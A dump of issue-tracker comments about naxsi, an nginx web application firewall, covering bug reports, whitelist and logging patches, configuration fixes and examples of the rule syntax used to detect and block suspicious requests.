to myself.\nthe request is \nselect  count() as ct, e.rule_id, e.zone, e.var_name, u.url, count(distinct c.peer_ip) as peer_count, (select count(distinct peer_ip) from connections) as ptot, (select count() from connections) as tot from exceptions as e, urls as u, connections as c where c.url_id = u.url_id and c.id_exception = e.exception_id GROUP BY u.url, e.var_name,e.zone, e.rule_id HAVING (ct) > ((select count(*) from connections)/1000)\nso in fact, the field should not be r['var_name'] but r['e.var_name']\nHTH\n. From nicolas....@gmail.com on June 20, 2013 14:59:38\nIf people are interested, here is my \"patch\" for nx_util/nx_lib/nx_whitelists.py.\nIt begins at line 91\nfor req in opti_select_DESC:\n        res = self.wrapper.execute(req)\n        #res = self.wrapper.getResults()\n        for r in res:\n          try:\n            if len(r['e.var_name']) > 0:\n                self.try_append({'url': r['u.url'], 'rule_id': r['e.rule_id'], 'zone': r['e.zone'],  'var_name': r['e.var_name'],\n                                 'hcount':  r['ct'], 'htotal': r['tot'], 'pcount':r['peer_count'], 'ptotal':r['ptot'],\n                                 'pratio': round((r['peer_count'] / float(r['ptot'])) * 100,2),\n                                 'hratio': round((r['ct'] / float(r['tot'])) * 100,2)\n                                 })\n            else:\n                self.try_append({'url': r['u.url'], 'rule_id': r['e.rule_id'], 'zone': r['e.zone'], 'var_name': '',\n                                 'hcount': r['ct'],  'htotal': r['tot'], 'ptotal':r['ptot'],\n                                 'pratio': round((r['peer_count'] / float(r['ptot'])) * 100,2),\n                                 'hratio': round((r['ct'] / float(r['tot'])) * 100,2),\n                                 'pcount':r['peer_count']})\n          except IndexError:\n            pass\n    return self.base_rules, self.final_rules\n. From ori...@gmail.com on May 14, 2013 02:50:41\nupdated documentation !\nStatus: Done\n. From moritz.f...@googlemail.com on June 23, 2013 15:47:18\nI now downloaded nx_util 1.0 from this website and tried again, it runs through but does not parse anything into it's sqlite database. \nFurther Details:\nI am running Owncloud with my Nginx Server. When using owncloud, the log files show nothing, the naxsi rules are not working (i double checked the configuration, it is similar to the guide i used in this site's wiki)\n. From ori...@gmail.com on July 06, 2013 01:16:25\nHi mex :)\nI think that so far, filtering only applies when acquiring data (log acquisition time).\nWe will have a look to see how it should be done to make it work as well on database extraction step as well.\n. From bandnew...@gmail.com on August 19, 2013 03:06:29\nSorry ,I've wrote a wrong word. \"Request in step 2 should be blocked by naxsi\" should be \"Request in step 2 should pass naxsi\"\n. From lazy.dog...@gmail.com on August 22, 2013 01:32:05\noh, restart didnt helped either.\nand the problem doesnt seem to exists with rule_ids < 1000\n. From lazy.dog...@gmail.com on August 22, 2013 04:06:48\ni can narrow it down a little bit, but still have 2 alerts when one rule is met:\nnaxsi-rule:\nMainRule \"str:com_\" \"msg:DN WEB_SERVER Generic JOOMLA-Exploit-Attempt (option=com_)\" \"mz:$ARGS_VAR:option\" \"s:$UWA:8\" id:42000062 ;\nRequest: \nGET /blah/index.php?option=com_joomla\nNaxsi-Event in Logfile: \n2013/08/22 12:59:32 [error] 23027#0: *85 NAXSI_FMT: ip=46.142.138.57&server=blah.org&uri=/blah/index.php&learning=1&vers=0.51&total_processed=39&total_blocked=1&zone0=ARGS&id0=42000062&var_name0=option&zone1=ARGS&id1=42000062&var_name1=option, client: me, server: _, request: \"GET /blah/index.php?option=com_joomla HTTP/1.1\", host: \"blag.org\"\ni can assure that the rules are included only one time and other rulres behave normally; the following generates a normal entry:\nMainRule \"str:/wp-admin\" \"msg:DN WEB_SERVER possible WP-Scan (wp-admin)\" \"mz:URL\" \"s:$UWA:8\" id:42000262 ;\n. Hi,\nI've just pushed a commit that should fix the error.\nWhich OS are you using to build naxsi ? I was not able to replicate the issue.\n. Hi,\nI've just pushed a commit that should fix the error.\nWhich OS are you using to build naxsi ? I was not able to replicate the issue.\n. Hi,\nVersions are still available.\nYou can find the list here : https://github.com/nbs-system/naxsi/releases.\nIf you want to download a specific release : (for example, 0.53-1) https://github.com/nbs-system/naxsi/archive/0.53-1.tar.gz.\n. Hi Nicolas,\nI'll have a look at your merge request tomorrow, and if everything looks fine, it will be merged immediately afterwards.\n. Hi Nicolas,\nJust 2 things : \n- If the log file is removed while nginx is running, NAXSI_FMTs won't be logged anymore, and there is no warning indicating that nginx cannot write to the log file. It would be nice to detect that and use the nginx error log as a fallback.\n- NAXSI_EXLOG (https://github.com/nbs-system/naxsi/wiki/dynamicmodifiers) are not written to the naxsi log file.\nOnce those 2 are fixed, this will (finally :)) get merged.\n. Hi,\nI'm not able to reproduce this.\nI suspect that you have a location for javascript file in your nginx configuration, and naxsi is not enabled in this location.\n. Hi,\nThe shebang was missing in nxtool.py. This is fixed in 7400c8be4c0ddb5493c7be27ee76e7adcee6a3c0.\n. Hi,\nIt seems you have forgot to include naxsi core rules file in the http section of your configuration.\nYou have to uncomment the line include /etc/nginx/naxsi_core.rules; in (i think) /etc/nginx/nginx.conf.\n. Hi,\nIt seems you forgot to include naxsi core rules file (you should include it in the http section, see https://github.com/nbs-system/naxsi/wiki/basicsetup).\n. Hi,\nThis is already possible using dynamic modifiers :)\nFor example, if you want to disable naxsi for the IP 8.8.8.8, put this in your server block : \nif ($remote_addr = \"8.8.8.8\") {\n     set $naxsi_flag_enable 0;\n}\nYou can find more information here: https://github.com/nbs-system/naxsi/wiki/dynamicmodifiers\n. Hi,\nYou are trying to extract stats about the coverage of the whitelists stored in ES , but the index nxapi does not exist in your elasticsearch. Have you inserted naxsi events in your ES instance (with the --files,--fifo or --stdin flag) first ?\n. Hi,\nGood idea to store the country name. But we also need to keep the raw coordinates as we use them to display data on a map in kibana.\nOnce the coordinates are back, it'll be good to merge.\n. Hi,\nThe core rules should not be included inside a location.\nMove the 'include \"/etc/nginx/naxsi_core.rules\";' outside the location and it will work.\n. Hi,\nCan you  try again with the latest commit ? I removed the keyword argument as it seems that you use python 2.6 which does not support keyword arguments for encode().\n. Hi,\nThis option is no longer present. It was briefly available only in the repo (no release), but we discovered a few bugs in it, allowing to crash the nginx child. We chose to remove the feature for the time being, as it is not really important (and you can emulate this using syslog for example, by making nginx log to syslog, and configuring syslog to send the logs to differents files based on the log line).\n. Hi,\nFrom the full stacktrace, it seems that you are using HTTP/2, and naxsi has not been tested yet with it (we will start working on it soon).\nCan you try to remove the http2 parameter from the listen directive in your configuration and see if the crash still occurs ?\n. Hi,\nIt seems you provided a wrong path to nginx, you have to provide the path of the naxsi_src directory (which would be /home/ubuntu/nginxmodule/naxsi-0.54/naxsi_src/ in your case). \n. Yes, naxsi does work with SSL. Naxsi doesn't use zlib, but nginx does in the gzip module. If you don't want to install zlib, just remove the gzip module from nginx (--without-http_gzip_module in your ./configure args should work). \n. Which version of naxsi do you use ? Regexes in whitelists are supported since version 0.52.\n. I'm not sure to understand what you're trying to achieve, so my response may be completely wrong :)                                                                                                                                            \nIf you want to enforce the content of some variables, i would probably use negative rules :                                                                                                                                                    \nBasicRule negative \"rx:\\d+\" \"mz:$HEADERS_VAR:header1|$URL:/foobar\" \"s:DROP\" id:4242;\nThis rule will drop (block the request even while in learning mode) all request having a HTTP header \"header1\" with a value that is not a number on the URL /foobar.\nNaxsi knows how to parse JSON (only if the content-type is application/json), so you can also enforce the validity of the JSON body : \nBasicRule negative \"str:my_var_content\" \"mz:$BODY_VAR:my_json_key\" \"s:DROP\" id:4243;\nYou can't change naxsi log file, it will always log to the file specified in error_log.\n. Hi,\nSeems that your rule (or you request) is wrong.\nYour rule will try to match testnaxsitest in the HTTP headers, but your request put testnaxsitest in a GET parameter, so naxsi wont block the request as the zones don't match.\nFor support, the best is to come on IRC on #naxsi on freenode.\n. Should be fixed in 2b17799, can you give it a try ?\n. It seems that you try to use SSL to connect to elasticsearch.\nCan you try to set use_ssl in nxapi.json to False?\n. I've just pushed (c7e8cff427eaf6b6ece1b0b1c8ddaba11bb21d45) a new default configuration that should correct your error (use_ssl should be a JSON true or false boolean value, not a string one).\n. No, should be (based on your previous conf): \nJSON\n{\n\"elastic\" : {\n \"host\" : \"127.0.0.1:9200\",\n \"use_ssl\" : false,\n \"index\" : \"nxapi\",\n \"doctype\" : \"events\",\n \"default_ttl\" : \"7200\",\n \"max_size\" : \"1000\",\n \"version\" : \"2\"\n}\n. Hello,\nI just tested it with the latest release (0.55.1), and it's working fine, which version are you using ? Do you have other 3rd party modules ?\n(On a sidenote, if you only want to generate the response from a lua file, i think content_by_lua_file is more appropriate than access_by_lua_file)\n. Hi,\nThanks for the report, but it seems to be a false positive.\nThe h->key.data is allocated at the line 970 (same thing for the other reports, the allocation is done a few lines before), with ngx_pcalloc() which calls ngx_memzero on the allocated buffer, so we will always a null terminator at the end of the string:\nc\nh->key.data = ngx_pcalloc(r->pool, strlen(NAXSI_HEADER_ORIG_URL)+1);\n. The list comprehension here is useless. .split() already returns a list.\n. Casting to bool is useless here. A non-empty list will evaluate to True in a condition.\n. Replace NGX_CONF_1MORE with NGX_CONF_TAKE1 as only the first argument is used ?\n. :(. Should be URL encoded ?. ",
    "buixor": "delayed until further notice, feedback tells it's not vital except for some specific corner cases.\nPlus blotus lost the code TWICE xD\n. He has hard time managing the balmer peak :)\n. JSON support added in naxsi-0.50, soap/xml is not in focus yet.\n. Hey Mex,\nI know it has been opened for long, but I guess you can actually make it with 0.53-1 & regex support now:\n$ARGS_VAR_X:^$\nshould work :)\n. fixed (0.53-1)\n. Hi,\nClosing issue, as nx_util reboot is coming\n. nx_util's dead, nxapi being introduced, won't fix :)\n. Hi,\nBy default naxsi does not parse host header's var.\nthe reason behind it is that it does not seem very revelant regarding how nginx's working.\nYou can still manually add it to your rules/core_rules.\nHere, actually, matched ID is 11, which corresponds to POST http protocol violation.\n. Hi,\nI think it's indeed a bug, as naxsi uses the | separator for the various parts of the matchzone.\nI'll see how to fix this in upcoming release, probably with escaping, however it's not very convenient.\n. Case sensitivity of whitelists was fixed in 0.53-1\nPlus, whitelists should always be written in lower case.\n. this was fixed in 0.53-1\n. ahah good catch didier :)\ncygwin, srsly ? :p\n. Hi,\nplease use last release (0.53-1).\nAs well, please check that you have the needed perl libraries (Test::nginx) needed :)\ncheers,\n. please follow this procedure :\n- download master branch (ie. zip) : https://github.com/nbs-system/naxsi/archive/master.zip\n- downlad nginx (ie. 1.5.6), extract to /tmp/nginx\n- cd naxsi-master/naxsi_src/\n- make re => Will configure & compile nginx + naxsi\n- make test => run unit tests\n. Hi,\nI'll try to have a look at it and let you know :)\ncheers,\n. Hi,\nI was unable to reproduce the case you faced (or misunderstood it xD) \n```\ncase 1\u00b0)\nBasicRule wl:1003,1004,1015 \"mz:$URL_X:^/api/./gettoken/|URL\";\nlynx  --dump \"http://127.0.0.1:4242/api//gettoken/foo,bar,52\" => allowed\ncase 2\u00b0)\nBasicRule wl:1003,1004,1015 \"mz:$URL_X:^/api/*/gettoken/|URL\";\nlynx  --dump \"http://127.0.0.1:4242/api/*/gettoken/foo,bar,52\" => allowed\nlynx  --dump \"http://127.0.0.1:4242/api/x/gettoken/foo,bar,52\" => denied\n```\nCan you please provide a reproducible test case if you believe there is an issue ?\ncheers ;)\n. Hey,\nactually, having 3 times the rule with unique IDs is the same as one rule with wl:X,Y,Z. It's just for convenience :)\nLet me know if you find what's the actual issue, I'm pretty interested in this kind of bugs (if it happens to be one ! :))\ncheers,\n. Ah ! nice finding :)\nI guess it's a bug indeed, I'll have a look at it !\n. Hey :)\nJust commited a patch that fixes this. Can you confirm ?\ncheers,\n. cool, I'm thus closing the issue :)\n. Hey Adrian,\nCan you tell me a bit more about what you are trying to achieve ?\nblocking hexa content, ie \\xAA or ?\n. hey :)\nnaxsi blocks / drops %00 encoding or any null bytes resulting of decoding.\nhowever, this is part of \"internal\" rules (along with ie protocol anomalies\nrules), as it's hard to express in classic rules style.\nYou can still add \\x00 rules if you feel it's needed, however I'm not\nconvinced, %00 tends to be used mostly in my opinion ?\nOn Mon, Nov 25, 2013 at 3:35 PM, adriandf notifications@github.com wrote:\n\nHi,\nin short yes, block say \\x00 type JavaScript encoding. Could have some\n\"uses\":\nhttps://blog.whitehatsec.com/hash-length-extension-attacks/ crypto attack\nhttp://blog.spiderlabs.com/2012/08/stripe-ctf-walkthrough.html -> Level 7\nchallenge, crypto attack\nhttp://www.exploit-db.com/exploits/22100/ for XSS\nor even SQLi.\nThanks,\nAdrian\n\u2014\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/issues/95#issuecomment-29205773\n.\n. oh cool :)\n\nCan you please let us know more about the attacks you saw (live) that use /\nrely on this kind of encoding ?\nCheers,\nOn Mon, Nov 25, 2013 at 4:04 PM, adriandf notifications@github.com wrote:\n\nin our logs we see quite some number of requests using \\x00 requests so\nwe did add a block. :)\n\u2014\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/issues/95#issuecomment-29208153\n.\n. Thanks,\n\nI will perform some tests to see whether it's worth it, however I'm a bit concerned about false positives.\nI'm closing the issue for now :)\n. Hi,\nI do not see really what's happening here, but I wish to help.\nCan you provide me a way to easily reproduce it (script / whatever), so I can look at it ?\nbtw, ID 13 & 2 are internals id.\nID 2 : File too big, stored on disk by nginx, not parsed by naxsi\nID 13 : Protocol violation in POST format\nMy first shot would be to say that the request is wrong (or naxsi think it is - at least)\nCheers,\n. oh, smells bad xD\nthe thing being :\n1\u00b0) If the client is broken, we won't/can't fix naxsi for that (guess you understand why)\n2\u00b0) If the client is not broken, and you provide me a way to reproduce the request that makes naxsi go nuts, we might be able to fix that.\nIf it's in a business context and you really need that, we can always arrange something (consultancy / customization)\n. For consultancy, you can reach me : tko at nbs-system.com\nRegarding your question, you need to add the zones, just as you did in your example.\nI noticed earlier you tried to combine \"classic\" match zones with \"regex\" match zones.\nIt is not meant to be, either use regex, or use classical ones, as it might lead to unknown behaviour (maybe I forgot to point it out in the documentation ?)\nie.\n\"mz:$URL:/foo|$ARGS_VAR_X:..\"\n. ahah nevermind my comment about mixing regex and classic zones, I confused your case with another issue ..\nsorry :)\n. mmh, that's weirder and weirder ...\nIf you provide me ways to reproduce the exact request (curl / python / whatever), I can look at it, but right now I really lack of information to help you :(\n. Can you please provide the \"test.txt\" file as well ?\n. broken client is broken ? :)\n. Hi,\nJust saw what you wrote earlier :\n'looking at the request I see the browser adds a \"Content-Type: text/plain\", '\nIf the client sends a request using text/plain content-type it will be rejected (didn't see you mentioned it).\nNaxsi does not know about this content type, and will refuse to parse it.\nCan you force the client to set a classic content-type (multipart / form-url..) ?\nIt might be the source of the issue,\nCheers,\n. Hi,\nIf you can provide me a reproducible way, I will be happy to look at it.\nIn the meanwhile, I'm closing the issue if you are ok with it (as you seemed to solve the issue + it's corner case), we can reopen it if needed :)\ncheers,\n. Hi,\nI would say it's a matchzone fail (ie. matchzone not checking exception).\nWhat you could do (beware, not in production as it's extremely verbose) is try to turn on debugging (uncomment the #define wl_debug_*) to see what's going on.\nUnfortunately, I won't have time to look at it these days :(\n. Hi,\nNaxsi does not proceed requests tagged as internal.\nThis might be your case of the @backend location.\nCan you provide a full example so I can give it a try ?\nCheers,\n. Hi,\nAs suspected, this is because the request is flagged as internal when arriving in @backend.\nNaxsi explicitely does not process internal requests (this is meant to avoid naxsi checking multiple times the same request when there is redirections and so on). I might be wrong, but this is because you are using try_files, as described on nginx's site, when using try_files \"If none of the files were found, an internal redirect to the uri specified in the last parameter is made.\", see : http://nginx.org/en/docs/http/ngx_http_core_module.html#try_files\nMy guess would be that the best way (even if not very convenient - I admit) would be to have your naxsi configuration included in each \"entry point\" location.\nI do not wish to remove this check, as this lead to many issues in the past.\nCheers,\n. Hi,\nfirst of all, thank you for your contribution and for this patch :)\nI do think indeed the patch is a good idea.\nHowever, regarding default log files, I'd prefer the following approach :\n- if no naxsi_logfile keyword is defined, it logs into existing error_log\n- if naxsi_logfile is defined in configuration, it specifies destination log file\nThis approach allows to keep backward compatibility for existing setups (which is crucial in a production context), and avoid hard coded log files paths.\nUnfortunately I'll be a bit busy for the coming weeks, so I'm afraid I won't have much time to play around that.\nIn the meanwhile, if you can have a look at the possibility to implement such a solution, it would make things easier.\nIn both cases, I'll try to get back to you asap !\nCheers,\n. Hi Nicolas,\nThanks for patch.\nI will review it after xmas / nye hollidays and keep you posted !\nGreat job :)\n. Hi,\nI should have some time to look at it this week-end, I'll keep you posted !\n. Hi Nicolas,\nYes I'm french, however, if you're ok, I'd prefer we stick to english.\nI started reading the patch more in detail, but as I'm not very familiar with nginx's logging system, and I will need some extra time. However, I have already a few suggestions :\n- move code to a separate c file ? just for clarity\n- would you mind creating unit tests ?\nRegarding unit tests (see http://search.cpan.org/~agent/Test-Nginx-0.22/lib/Test/Nginx/Socket.pm) there is already a lot of them in the directory t/ in the repo.\nNaxsi's Makefile somehow supports building with libgcov. \"make test\" will run unit tests and produce a html report of code % covered by unit tests, you should aim for enough tests to cover most easily reproducible corner cases.\ncheers,\n. Hi Nicolas,\nThat's nice ! Looking forward to this ;)\ncheers,\nOn Tue, Feb 11, 2014 at 9:19 PM, Nicolas Zin notifications@github.comwrote:\n\nHello,\nsorry for the delay.\n- no pb to stick to english.\n- I updated my repo, and separate log function into a specific C file.\n- I will try to make unit tests working and based on that see if I can\n  build relevant tests cases.\nthanks\nOn Sat, Jan 25, 2014 at 8:47 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nYes I'm french, however, if you're ok, I'd prefer we stick to english.\nI started reading the patch more in detail, but as I'm not very familiar\nwith nginx's logging system, and I will need some extra time. However, I\nhave already a few suggestions :\n- move code to a separate c file ? just for clarity\n- would you mind creating unit tests ?\nRegarding unit tests (see\nhttp://search.cpan.org/~agent/Test-Nginx-0.22/lib/Test/Nginx/Socket.pm)\nthere is already a lot of them in the directory t/ in the repo.\nNaxsi's Makefile somehow supports building with libgcov. \"make test\" will\nrun unit tests and produce a html report of code % covered by unit tests,\nyou should aim for enough tests to cover most easily reproducible corner\ncases.\ncheers,\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-33289279>\n.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-34801046\n.\n. Hi,\n\nI'm totally to blame here, Nicolas did a great job, but I just didn't find time to test it enough to feel confident merging it. Nicolas, do you use it in production yet ?\nFeedback would really help here, as  I don't feel confident enough in my knowledge of nginx's logging internals to judge the stability of this code ...\nI think I will merge it anyway, just a bit afraid of potential backfire ;p\n. Hi,\nThanks for the ongoing testing.\nTo answer Nicolas's last question, I would say naxsi will log block access (NAXSI_FMT) at the same place, as it's the same function that's used.\ncheers,\n. Hi,\nI'm happy to see there is some good progress on this, thanks Nicolas & Reto\n:)\nI think we will be able to merge it within short time as it seems that\nthere is now some positive production feedback.\nCan you guys continue production test for a few more days before we merge\nit ? I will try to take some time as well to continue testing & auditing it\nbefore merge ! (I hope this week-end, I should be less busy until end of\nApr)\nCheers,\nOn Sat, Apr 5, 2014 at 8:22 PM, binaryanomaly notifications@github.comwrote:\n\nYes, everything's fine over here! :)\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 5. April 2014 at 20:17:37\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly\nSubject:  Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\nis it still working fine?\nOn my side, things are going smoothly: still logging, logrotate working\nfine (and nx_util working fine on the logs)\nRegards,\nNicolas\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39646492\n.\n. Hi Nicolas !\n\nMy bad for all the delay, actually, I saw that nginx 1.7.1 added syslog support !\nI want to have a look at this ... do you think the patch is still needed ?\nOn the other hand, as it seems to run in production on your side without any issues (that I'm aware of :p), I guess I would be ok for the merge ;) (Just need to make sure it won't conflict with those modificaitons)\nCheers, and sorry again for the delay !\n. Hi,\nUnfortunately this week-end I won't have any internet access, so I'd be glad if you can have a look.\nNext week I'll be back at the office, so we can do the merge and collect eventual feedback !\ncheers\n. Hi Nicolas,\nI'm really sorry, but I don't have much time to work on naxsi right now.\nI should have more bandwith next month (mid-september), I will keep you\nposted.\nThanks for your patience; and sorry for the lag on my side ;)\nOn Tue, Aug 19, 2014 at 8:58 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHi Thibault,\nanny news to integrate my patch?\nRegards,\nOn Sat, Jun 28, 2014 at 3:24 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nHi,\nI have recompiled naxsi (with my diff) without problem with nginx 1.7.2.\nIt is running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly notifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then switched\nback to the official tree because I had to reinstall nginx for other\nreasons. Didn't encounter any problems afaik. Someone should double\ncheck\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057.\n\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-52682151.\n. yes i will !!\n\nOn Fri, Sep 26, 2014 at 6:02 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHello Thibault,\nI come to the news. Do you have time this end of september to integrate my\npatch?\nRegards,\nNicolas\nOn Tue, Aug 26, 2014 at 5:44 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nI'm really sorry, but I don't have much time to work on naxsi right now.\nI should have more bandwith next month (mid-september), I will keep you\nposted.\nThanks for your patience; and sorry for the lag on my side ;)\nOn Tue, Aug 19, 2014 at 8:58 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHi Thibault,\nanny news to integrate my patch?\nRegards,\nOn Sat, Jun 28, 2014 at 3:24 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nHi,\nI have recompiled naxsi (with my diff) without problem with nginx\n1.7.2.\nIt is running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly \nnotifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then\nswitched\nback to the official tree because I had to reinstall nginx for\nother\nreasons. Didn't encounter any problems afaik. Someone should double\ncheck\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057.\n\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-52682151.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-53397463.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-56981911.\n. Hi Nicolas,\n\nI will do this over the week-end, sounds good :)\nOn Fri, Sep 26, 2014 at 6:15 PM, bui orixxx@gmail.com wrote:\n\nyes i will !!\nOn Fri, Sep 26, 2014 at 6:02 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHello Thibault,\nI come to the news. Do you have time this end of september to integrate\nmy\npatch?\nRegards,\nNicolas\nOn Tue, Aug 26, 2014 at 5:44 AM, buixor notifications@github.com\nwrote:\n\nHi Nicolas,\nI'm really sorry, but I don't have much time to work on naxsi right\nnow.\nI should have more bandwith next month (mid-september), I will keep you\nposted.\nThanks for your patience; and sorry for the lag on my side ;)\nOn Tue, Aug 19, 2014 at 8:58 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHi Thibault,\nanny news to integrate my patch?\nRegards,\nOn Sat, Jun 28, 2014 at 3:24 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nHi,\nI have recompiled naxsi (with my diff) without problem with nginx\n1.7.2.\nIt is running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly \nnotifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then\nswitched\nback to the official tree because I had to reinstall nginx for\nother\nreasons. Didn't encounter any problems afaik. Someone should\ndouble\ncheck\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\n<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057>.\n\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-52682151.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-53397463.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-56981911.\n. finally \\o/\n\n\nOn Mon, Oct 13, 2014 at 2:05 PM, blotus notifications@github.com wrote:\n\nMerged #100 https://github.com/nbs-system/naxsi/pull/100.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#event-177610525.\n. Hi,\n\nThanks for the notice, I will try to look at it soon, however I'll be a bit busy for the coming weeks, but I will get back to you asap !\n. Forgot to clode this one, but was fixed some time ago. Thanks for the notice,\n. Hi,\nCan you provide a bit more details please ?\nWhen you say the other subpages pages work, it means you have/see data inside ?\ncheers,\n. Hi,\nthen it's expected, the home page is empty (sounds weird, but it is).\nIf you have any further issues, please let me know.\n. Hi,\nI'm not sure to understand exactly the issue you report.\nI understand that  \"naxsi will block POST request if there is not to CRLF between the end of the headers and the start of the body\" am I right ?\nAs far as I know, the correct POST/PUT http/1.1 syntax is \n\nPOST ...\n...\nlast_header: foo\\r\\n\n\\r\\n\nBODY\n\nThus, it seems ok to me that naxsi blocks request if the headers are not folowed by CRLF before body starts.\nPlease let me know,\n. Hi,\nCan you please provide your full rule ? :)\nI cannot judge without more detailed information, but my best guess would be a wrong / incorrect regex or rule !\ncheers,\n. Hi,\nI just tried your example and it seems to work for me :\n\n\n\n\n\n\n\n\n==> /tmp/ngx_error.log <==\n2014/04/17 15:46:39 [error] 9949#0: *1 NAXSI_FMT: ip=127.0.0.1&server=127.0.0.1&uri=/POST&learning=1&vers=0.53-1&total_processed=1&total_blocked=1&block=1&cscore0=$EVADE&score0=8&zone0=BODY&id0=1820&var_name0=hello, client: 127.0.0.1, server: localhost, request: \"POST /POST HTTP/1.1\", host: \"127.0.0.1:4242\"\nCan you please provide another example ?\n. Hi,\nJust tried with an image, got the same result.\nCan you check that your request does not get buffered to filesystem and that you did not whitelist id:2 ?\ncheers,\n. Hi,\nid 2 means that the request's body was buffered to a file by nginx as it's too big.\nnaxsi does not parse those requests, see client_body_buffer_size.\nWhenever you disable a rule < 1000 in naxsi, look at the wiki (https://github.com/nbs-system/naxsi/wiki/naxsilogs) or src to know what it means, as it is usually internal rules that partially or completely disable naxsi.\n. So that allow/deny directives do not interfere.\nMakes sense to me that the applicative firewalling intervenes after the fact that you decided you might simply want to reject a query because of authentication or ip-based whitelists.\nDo you agree ?\n. fixed !\n. I think you might have incorrect sources ?\nHere I have :\nID16 : ngx_http_rule_t nx_int__empty_post_body = {/type/ 0, /whitelist flag/ 0, \n                       /wl_id ptr/ NULL, /rule_id/ 16, ...\nID15: ngx_http_rule_t nx_int__invalid_json = {/type/ 0, /whitelist flag/ 0, \n                    /wl_id ptr/ NULL, /rule_id/ 15, ...\nCan you confirm ? :)\n. I'm closing it for now, please open if think I'm wrong ;)\n. Hi Didier,\nMappings are not the same between this early non-prod tool and nxtool,\nmerge denied ;)\n. Hi,\nyes you can (if I understood you correctly), this is what mainrules are doing.\nIf you look @naxsi_core.rules, you will find several examples, either on rx or str :)\ncheers,\n. https://github.com/nbs-system/naxsi/wiki/whitelists\nso, if you want it to be apply to all headers, matchzone should just be \"mz:HEADERS\" ;)\ncheers,\n. Hi,\nWhy would you need this ?\n. Hi !\nThanks for the detailed report, seems like a bug :)\nHowever, I will be on hollidays for ~15 days, so I won't have time to look at this soon :/\nI'll keep you posted !\n. Thanks for the report, I fixed the bug (even somehow it was not a bug, but a side-effect :p).\nI will wait a bit before pushing it upstream, to ensure that it doesn't break anything :)\n. Hi,\nI agree with itpp16, this is administrator's duty to apply accurate wls ;)\ncheers\n. Hi Guillaume,\nThanks a lot for the patch, I provided a few comments, as it seems your version was not up-to-date with the master ;)\ncheers\n. Hi,\nnx_util is dead and unmaintained, please switch to nxtool/nxapi :)\n. Hi,\nCan you specify the environment in which you try to compile it ?\nLast time I tried, I didn't face any issue.\nBest regards,\n. ahah, I forgot about that :)\nI guess it's the merge from @nzin patch responsible.\nDo you have a patch suggestion, or do you want us to work on it ? (I don't have any windows box at hand reach)\n. thanks for your reactivity Nicolas :)\n. Hi,\nSorry, quite busy today :(\nI'll try to give it a look tomorrow or at least by end of week.\nOn Tue, Nov 18, 2014 at 9:10 AM, itpp16 notifications@github.com wrote:\n\nbuixor & nzin, can you have a look at the latest 146 pull ?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-63435119.\n. Hi,\n\nI guess one solution (not sure it fits your needs) would be to use the negative rules, ie.\nBasicRule id:X negative \"rx:^foobarbaz$\" \"mz:$ARGS_VAR:myVariable|$URL:/test.jsp\" \"s:BLOCK\";\nIt would then block any request to /test.jsp with arg myVariable if the content is not foobarbaz.\nYou can find an exemple in the core_rules with the content type :\nMainRule negative \"rx:multipart/form-data|application/x-www-form-urlencoded\" \"msg:Content is neither mulipart/x-www-form..\" \"mz:$HEADERS_VAR:Content-type\" \"s:$EVADE:4\" id:1402;\nPlease let me know if it fits your needs :)\n. Hi,\nNo it shouldn't, it would just be a \"new rule\".\nThus you can apply the 